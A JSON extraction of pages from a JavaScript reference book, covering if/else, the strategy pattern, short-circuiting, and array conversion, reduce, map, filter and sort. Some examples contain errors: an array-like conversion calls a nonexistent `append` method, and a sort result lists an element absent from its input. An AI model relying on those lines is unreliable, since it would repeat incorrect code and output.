    },
    {
        "text": "    default :",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      console. log ( \"No case was matched.\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       break ;    // precautionary break if case order changes }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 11.3: If / Else If / Else Control",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In its most simple form, an  if  condition can be used like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  i  =   0 ; if   ( i  <   1 )   {     console. log ( \"i is smaller than 1\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The condition  i  <   1  is evaluated, and if it evaluates to  true  the block that follows is executed. If it evaluates to false , the block is skipped. An  if  condition can be expanded with an  else  block. The condition is checked  once  as above, and if it evaluates to false  a secondary block will be executed (which would be skipped if the condition were  true ). An example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( i  <   1 )   {     console. log ( \"i is smaller than 1\" ); }   else   {     console. log ( \"i was not smaller than 1\" ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Supposing the  else  block contains nothing but another  if  block (with optionally an  else  block) like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( i  <   1 )   {     console. log ( \"i is smaller than 1\" ); }   else   {      if   ( i  <   2 )   {         console. log ( \"i is smaller than 2\" );      }   else   {         console. log ( \"none of the previous conditions was true\" );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then there is also a di\ufb00erent way to write this which reduces nesting:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( i  <   1 )   {     console. log ( \"i is smaller than 1\" ); }   else   if   ( i  <   2 )   {     console. log ( \"i is smaller than 2\" ); }   else   {     console. log ( \"none of the previous conditions was true\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 78 }",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Some important footnotes about the above examples: If any one condition evaluated to  true , no other condition in that chain of blocks will be evaluated, and all corresponding blocks (including the  else  block) will not be executed. The number of  else   if  parts is practically unlimited. The last example above only contains one, but you can have as many as you like. The  condition  inside an  if  statement can be anything that can be coerced to a boolean value, see the topic on boolean logic for more details; The  if - else - if  ladder exits at the \ufb01rst success. That is, in the example above, if the value of  i  is 0.5 then the \ufb01rst branch is executed. If the conditions overlap, the \ufb01rst criteria occurring in the \ufb02ow of execution is executed. The other condition, which could also be true is ignored. If you have only one statement, the braces around that statement are technically optional, e.g this is \ufb01ne:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( i  <   1 )  console. log ( \"i is smaller than 1\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And this will work as well:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( i  <   1 )     console. log ( \"i is smaller than 1\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If you want to execute multiple statements inside an  if  block, then the curly braces around them are mandatory. Only using indentation isn't enough. For example, the following code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( i  <   1 )     console. log ( \"i is smaller than 1\" );     console. log ( \"this will run REGARDLESS of the condition\" );   // Warning, see text!",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "is equivalent to:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( i  <   1 )   {     console. log ( \"i is smaller than 1\" ); } console. log ( \"this will run REGARDLESS of the condition\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 11.4: Strategy",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "A strategy pattern can be used in JavaScript in many cases to replace a switch statement. It is especially helpful when the number of conditions is dynamic or very large. It allows the code for each condition to be independent and separately testable. Strategy object is simple an object with multiple functions, representing each separate condition. Example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  AnimalSays  =   {     dog  ()   {          return   'woof' ;      },     cat  ()   {          return   'meow' ;      },",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 79",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    lion  ()   {          return   'roar' ;      },",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // ... other animals",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     default   ()   {          return   'moo' ;      } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The above object can be used as follows:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  makeAnimalSpeak  ( animal )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Match the animal by type",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     const  speak  =  AnimalSays [ animal ]   ||  AnimalSays. default ;     console. log ( animal  +   ' says '   +  speak ()); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "makeAnimalSpeak ( 'dog' )   // => 'dog says woof' makeAnimalSpeak ( 'cat' )   // => 'cat says meow' makeAnimalSpeak ( 'lion' )   // => 'lion says roar' makeAnimalSpeak ( 'snake' )   // => 'snake says moo'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the last case, our default function handles any missing animals.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 11.5: Using || and && short circuiting",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The Boolean operators  ||  and  &&  will \"short circuit\" and not evaluate the second parameter if the \ufb01rst is true or false respectively. This can be used to write short conditionals like:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   10 x  ==   10   &&  alert ( \"x is 10\" ) x  ==   10   ||  alert ( \"x is not 10\" )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 80",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 12: Arrays",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 12.1: Converting Array-like Objects to Arrays",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "What are Array-like Objects?",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "JavaScript has \"Array-like Objects\", which are Object representations of Arrays with a length property. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  realArray  =   [ 'a' ,   'b' ,   'c' ]; var  arrayLike  =   {    0 :   'a' ,    1 :   'b' ,    2 :   'c' ,   length :   3 };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Common examples of Array-like Objects are the  arguments  object in functions and  HTMLCollection  or  NodeList",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "objects returned from methods like  document. getElementsByTagName  or  document. querySelectorAll .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, one key di\ufb00erence between Arrays and Array-like Objects is that Array-like objects inherit from Object. prototype  instead of  Array. prototype . This means that Array-like Objects can't access common  Array prototype methods  like  forEach () ,  push () ,  map () ,  filter () , and  slice () :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  parent  =  document. getElementById ( 'myDropdown' ); var  desiredOption  =  parent. querySelector ( 'option[value=\"desired\"]' ); var  domList  =  parent. children ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "domList. indexOf ( desiredOption );   // Error! indexOf is not defined.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "domList. forEach ( function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  arguments. map ( /* Stuff here */ )   // Error! map is not defined. });   // Error! forEach is not defined.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  func ()   {   console. log ( arguments ); } func ( 1 ,   2 ,   3 );     //  \u2192  [1, 2, 3]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Convert Array-like Objects to Arrays in ES6",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Array. from : 1.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "const  arrayLike  =   {    0 :   'Value 0' ,    1 :   'Value 1' ,   length :   2 }; arrayLike. forEach ( value  =>   { /* Do something */ });   // Errors const  realArray  =  Array. from ( arrayLike ); realArray. forEach ( value  =>   { /* Do something */ });   // Works for ... of : 2.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  realArray  =   []; for ( const  element of arrayLike )   {   realArray. append ( element ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 81",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Spread operator: 3.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "[ ... arrayLike ] Object. values : 4.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 7",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  realArray  =  Object. values ( arrayLike ); Object. keys : 5.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  realArray  =  Object    . keys ( arrayLike )    . map (( key )   =>  arrayLike [ key ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Convert Array-like Objects to Arrays in  \u2264  ES5",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use  Array. prototype . slice  like so:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arrayLike  =   {    0 :   'Value 0' ,    1 :   'Value 1' ,   length :   2 }; var  realArray  =  Array. prototype . slice . call ( arrayLike ); realArray  =   [] . slice . call ( arrayLike );   // Shorter version realArray. indexOf ( 'Value 1' );   // Wow! this works",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can also use  Function. prototype . call  to call  Array. prototype  methods on Array-like objects directly, without converting them:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  domList  =  document. querySelectorAll ( '#myDropdown option' ); domList. forEach ( function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Do stuff });   // Error! forEach is not defined.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Array. prototype . forEach . call ( domList ,   function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Do stuff });   // Wow! this works",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can also use  [] . method . bind (  arrayLikeObject  )  to borrow array methods and glom them on to your object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  arrayLike  =   {    0 :   'Value 0' ,    1 :   'Value 1' ,   length :   2 }; arrayLike. forEach ( function ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Do stuff });   // Error! forEach is not defined.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "[] . forEach . bind ( arrayLike )( function ( val ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // Do stuff with val",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 82",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "});   // Wow! this works",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Modifying Items During Conversion",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In ES6, while using  Array. from , we can specify a map function that returns a mapped value for the new array being created.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Array. from ( domList ,  element  =>  element. tagName );   // Creates an array of tagName's",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "See Arrays are Objects for a detailed analysis.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 12.2: Reducing values",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "The  reduce ()  method applies a function against an accumulator and each value of the array (from left-to-right) to reduce it to a single value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Array Sum",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This method can be used to condense all values of an array into a single value:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 1 ,   2 ,   3 ,   4 ] . reduce ( function ( a ,  b )   {    return  a  +  b ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//  \u2192  10",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Optional second parameter can be passed to  reduce () . Its value will be used as the \ufb01rst argument (speci\ufb01ed as  a ) for the \ufb01rst call to the callback (speci\ufb01ed as  function ( a ,  b ) ).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 2 ] . reduce ( function ( a ,  b )   {   console. log ( a ,  b );   // prints: 1 2    return  a  +  b ; },   1 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//  \u2192  3",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Flatten Array of Objects",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The example below shows how to \ufb02atten an array of objects into a single object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  array  =   [{     key :   'one' ,     value :   1 },   {     key :   'two' ,     value :   2 },   {     key :   'three' ,     value :   3 }];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2264 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "array. reduce ( function ( obj ,  current )   {   obj [ current. key ]   =  current. value ;    return  obj ; },   {});",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 83",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "array. reduce (( obj ,  current )   =>  Object. assign ( obj ,   {    [ current. key ]:  current. value }),   {});",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 7",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "array. reduce (( obj ,  current )   =>   ({ ... obj ,   [ current. key ]:  current. value }),   {});",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that the  Rest/Spread Properties  is not in the list of  \ufb01nished proposals of ES2016 . It isn't supported by ES2016. But we can use babel plugin  babel-plugin-transform-object-rest-spread  to support it. All of the above examples for Flatten Array result in: {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  one :   1 ,   two :   2 ,   three :   3 }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Map Using Reduce",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "As another example of using the  initial value  parameter, consider the task of calling a function on an array of items, returning the results in a new array. Since arrays are ordinary values and list concatenation is an ordinary function, we can use  reduce  to accumulate a list, as the following example demonstrates:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  map ( list ,  fn )   {    return  list. reduce ( function ( newList ,  item )   {      return  newList. concat ( fn ( item ));    },   []); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Usage:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "map ([ 1 ,   2 ,   3 ],   function ( n )   {   return  n  *  n ;   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//  \u2192  [1, 4, 9]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that this is for illustration (of the initial value parameter) only, use the native  map  for working with list transformations (see Mapping values for the details).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Find Min or Max Value",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "We can use the accumulator to keep track of an array element as well. Here is an example leveraging this to \ufb01nd the min value:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   [ 4 ,   2 ,   1 ,   - 10 ,   9 ] arr. reduce ( function ( a ,  b )   {    return  a  <  b  ?  a  :  b",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "},   Infinity );",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//  \u2192  -10",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Find Unique Values",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Here is an example that uses reduce to return the unique numbers to an array. An empty array is passed as the second argument and is referenced by  prev .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 84",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  arr  =   [ 1 ,   2 ,   1 ,   5 ,   9 ,   5 ]; arr. reduce (( prev ,  number )   =>   {    if ( prev. indexOf ( number )   ===   - 1 )   {     prev. push ( number );    }    return  prev ; },   []);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//  \u2192  [1, 2, 5, 9]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.3: Mapping values",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "It is often necessary to generate a new array based on the values of an existing array. For example, to generate an array of string lengths from an array of strings:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "[ 'one' ,   'two' ,   'three' ,   'four' ] . map ( function ( value ,  index ,  arr )   {    return  value. length ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//  \u2192  [3, 3, 5, 4]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "[ 'one' ,   'two' ,   'three' ,   'four' ] . map ( value  =>  value. length );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//  \u2192  [3, 3, 5, 4]",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this example, an anonymous function is provided to the  map ()  function, and the map function will call it for every element in the array, providing the following parameters, in this order: The element itself The index of the element (0, 1...) The entire array Additionally,  map ()  provides an  optional  second parameter in order to set the value of  this  in the mapping function. Depending on the execution environment, the default value of  this  might vary: In a browser, the default value of  this  is always  window :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 'one' ,   'two' ] . map ( function ( value ,  index ,  arr )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  console. log ( this );   // window (the default value in browsers)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return  value. length ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can change it to any custom object like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 'one' ,   'two' ] . map ( function ( value ,  index ,  arr )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  console. log ( this );   // Object { documentation: \"randomObject\" }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return  value. length ; },   {   documentation :   'randomObject' });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.4: Filtering Object Arrays",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  filter ()  method accepts a test function, and returns a new array containing only the elements of the original array that pass the test provided.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 85",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Suppose we want to get all odd number in an array:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  numbers  =   [ 5 ,   32 ,   43 ,   4 ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  odd  =  numbers. filter ( function ( n )   {    return  n  %   2   !==   0 ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "let  odd  =  numbers. filter ( n  =>  n  %   2   !==   0 );   // can be shortened to (n => n % 2)",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "odd  would contain the following array:  [ 5 ,   43 ] . It also works on an array of objects:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  people  =   [{   id :   1 ,   name :   \"John\" ,   age :   28 },   {   id :   2 ,   name :   \"Jane\" ,   age :   31 },   {   id :   3 ,   name :   \"Peter\" ,   age :   55 }];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 5.1",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "var  young  =  people. filter ( function ( person )   {    return  person. age   <   35 ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "let  young  =  people. filter ( person  =>  person. age   <   35 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "young  would contain the following array: [{",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  id :   1 ,   name :   \"John\" ,   age :   28 },   {   id :   2 ,   name :   \"Jane\" ,   age :   31 }]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can search in the whole array for a value like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  young  =  people. filter (( obj )   =>   {    var  flag  =   false ;   Object. values ( obj ) . forEach (( val )   =>   {      if ( String ( val ) . indexOf ( \"J\" )   >   - 1 )   {       flag  =   true ;        return ;      }         });    if ( flag )   return  obj ; });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 86",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This returns: [{",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  id :   1 ,   name :   \"John\" ,   age :   28 },{   id :   2 ,   name :   \"Jane\" ,   age :   31 }]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 12.5: Sorting Arrays",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  . sort ()  method sorts the elements of an array. The default method will sort the array according to string Unicode code points. To sort an array numerically the  . sort ()  method needs to have a  compareFunction  passed to it. Note:  The  . sort ()  method is impure.  . sort ()  will sort the array  in-place , i.e., instead of creating a sorted copy of the original array, it will re-order the original array and return it.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Default Sort",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Sorts the array in UNICODE order.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 's' ,   't' ,   'a' ,   34 ,   'K' ,   'o' ,   'v' ,   'E' ,   'r' ,   '2' ,   '4' ,   'o' ,   'W' ,   - 1 ,   '-4' ] . sort ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[- 1 ,   '-4' ,   '2' ,   34 ,   '4' ,   'E' ,   'K' ,   'W' ,   'a' ,   'l' ,   'o' ,   'o' ,   'r' ,   's' ,   't' ,   'v' ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note:  The uppercase characters have moved above lowercase. The array is not in alphabetical order, and numbers are not in numerical order.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Alphabetical Sort",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 's' ,   't' ,   'a' ,   'c' ,   'K' ,   'o' ,   'v' ,   'E' ,   'r' ,   'f' ,   'l' ,   'W' ,   '2' ,   '1' ] . sort (( a ,  b )   =>   {    return  a. localeCompare ( b );          });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Results in:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ '1' ,   '2' ,   'a' ,   'c' ,   'E' ,   'f' ,   'K' ,   'l' ,   'o' ,   'r' ,   's' ,   't' ,   'v' ,   'W' ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
